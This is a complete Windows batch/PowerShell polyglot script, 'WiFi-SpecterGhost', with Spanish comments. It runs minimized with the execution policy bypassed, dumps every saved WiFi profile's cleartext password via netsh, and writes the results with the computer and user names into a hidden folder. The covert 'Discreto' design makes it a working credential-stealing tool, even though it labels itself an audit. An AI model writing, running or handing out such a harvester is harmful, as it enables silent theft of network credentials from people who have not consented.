<# :
@echo off
:: WiFi-SpecterGhost [Discreto Mode]
:: Este archivo es portable e independiente.
if not "%1"=="min" (
    start /min powershell -ExecutionPolicy Bypass -WindowStyle Minimized -Command "iex (Get-Content '%~f0' -Raw)"
    exit /b
)
#>

# --- WiFi-SpecterGhost Engine [Embedded - Discreto] ---
$Silent = $true
$UseHiddenFolder = $true
$OutputName = "wpsd.txt"
$FolderName = "logs"

$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $scriptDirectory) { $scriptDirectory = Get-Location }

# --- Configuracion de rutas y nombres ---
$targetFolder = Join-Path -Path $scriptDirectory -ChildPath $FolderName
try {
    if (-not (Test-Path -Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
    }
    $folderItem = Get-Item -Path $targetFolder -Force
    if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
        $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
} catch { }

# Lógica de incremento
$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
$extension = [System.IO.Path]::GetExtension($OutputName)
$finalOutputName = $OutputName
$counter = 1

while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
    $finalOutputName = "$baseName.$counter$extension"
    $counter++
}

$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName

# Escribir encabezado de metadata
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    "=========================================" | Add-Content -Path $outputFilePath -Encoding UTF8
    " AUDITORIA: WiFi-SpecterGhost            " | Add-Content -Path $outputFilePath -Encoding UTF8
    " FECHA    : $timestamp                   " | Add-Content -Path $outputFilePath -Encoding UTF8
    " EQUIPO   : $computerName                " | Add-Content -Path $outputFilePath -Encoding UTF8
    " USUARIO  : $userName                    " | Add-Content -Path $outputFilePath -Encoding UTF8
    "=========================================" | Add-Content -Path $outputFilePath -Encoding UTF8
    "" | Add-Content -Path $outputFilePath -Encoding UTF8
} catch { }

# Obtener perfiles
$profilesOutput = (netsh wlan show profiles 2>$null)
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s*(?:Perfil de todos los usuarios|All User Profile)\s*:\s*(.+)$' }

if ($profileLines) {
    foreach ($line in $profileLines) {
        $profileName = ($line -split ':', 2)[1].Trim()
        $password = "[No encontrada]"
        try {
            $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
            $keyLine = $profileDetailOutput | Where-Object { $_ -match '^\s*(?:Contenido de la clave|Key Content)\s*:\s*(.+)$' }
            if ($keyLine) { $password = ($keyLine -split ':', 2)[1].Trim() }
        } catch { continue }
        try {
            "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
            "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
            "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
        } catch { }
    }
}
